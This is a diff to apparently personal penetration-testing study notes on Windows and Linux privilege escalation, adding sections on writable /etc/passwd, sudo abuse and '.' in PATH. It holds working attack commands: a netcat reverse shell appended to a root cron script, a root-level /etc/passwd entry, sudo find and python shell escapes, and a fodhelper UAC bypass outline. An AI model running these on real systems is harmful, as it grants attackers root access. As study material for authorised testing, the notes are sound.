@@ -62,8 +62,6 @@ once we know the versions we can look for exports targeting those driver version
 * on win ``reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`` OR ``reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer`` is some of those are enabled any user can run windows installer packages with elevated priviledges
 * Baniary is owned by root and has the suid bit set any user can execute this binary with elevating priviledges ``find / -perm -u=s -type f 2>/dev/null``, f.e.: if the copy command is suid set then we can copy to senenstive files
 
-
-
 # automated enumeration
 doing it manually takes too much time, thankfully can be automated, check [win-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
 On linux: f.e.: https://github.com/leonteale/pentestpackage/blob/master/web_shells/unix-privesc-check
@@ -79,7 +77,7 @@ Allows admin user to do some hight integrity actions by bypassing integrity leve
 * Using ``C:\Windows\System32\fodhelper.exe`` target win 10 build 17.09 (specific build)
 * We start this binary and inspect the manifest with ``sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe`` we see that Admin is requited but it can auto elevate integrity
 * Start process monitor: ``procmon.exe``
-=> check further on pdf or video
+=> check further on pdf or videoP
 * we changed registries (there for instance information is stored on how to start a program)
 * we adjusted a registry to execute shell and then we gained the high integritiy cmd
 
@@ -141,6 +139,16 @@ Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd /var/scripts/ && ./user_backups.
 * Since an unprivileged user can modify the contents of the backup script, we can edit it and add a reverse shell one-liner ``echo >> user_backup.sh`` && ``echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh``
 * Open nc reverese shell in kali => and once this CJ runs we should have root acccess shell
 
+
+## Insecure File Permissions: /etc/passwd Case Study
+Linux passwords are generally stored in `/etc/shadow`, which is not readable by normal users. Historically however, password hashes, along with other account information, were stored in the world-readable file `/etc/passwd`
+
+* `/etc/passwd` if available is firstly taken over `/etc/shadow`
+* if availabe, can create a pw in hash `openssl passwd evil` generate typically something like `AK24fcSx2Il3I`
+* put root 2 users into `etc/passwd` => `echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd`
+* then you might login as this user: `su root2`
+
+
 ## Exploiting services which are running as root
 *Exploiting any service which is running as root will give you Root!* Example MySQL
 
@@ -160,7 +168,23 @@ SUID which stands for set user ID, is a Linux feature that allows users to execu
     You should never set SUID bit on any file editor/compiler/interpreter as an attacker can easily read/overwrite any files present on the system.
 
 ## Exploiting SUDO rights/user
-If the attacker can’t directly get root access via any other techniques he might try to compromise any of the users who have SUDO access
+If the attacker can’t directly get root access via any other techniques he might try to compromise any of the users who have SUDO access.
+A classic example of this is assigning SUDO rights to the find command so that another user can search for particular files/logs in the system. While the admin might be unaware that the ‘find’ command contains parameters for command execution, an attacker can execute commands with root privilege.
+
+* `sudo -l` – Prints the commands which we are allowed to run as SUDO
+* f.e.: We can run find, cat and python as SUDO. These all commands will run as root when run with SUDO => `sudo find /home -exec sh -i \;` – find command’s exec parameter can be used for arbitrary code execution or with pyhton to get bash `sudo python -c ‘import pty;pty.spawn(“/bin/bash”);` – spawns a shell
+
+> Never give SUDO rights to any of the programming language compiler, interpreter and editors.
+> This technique can also be applied to vi, more, less, perl, ruby, gdb and others
+
+## Exploiting users with ‘.’ in their PATH
+Having ‘.’ in your PATH means that the user is able to execute binaries/scripts from the current directory. To avoid having to enter those two extra characters every time, the user adds ‘.’ to their PATH. This can be an excellent method for an attacker to escalate his/her privilege
+
+Let’s say Susan is an administrator and she adds ‘.’ in her path so that she doesn’t have to write the 2 characters again.
+
+With ‘.’ in path – program
+Without ‘.’ in path – ./program
 
 ## Kernel exploits 
 use this if other things not possible
+
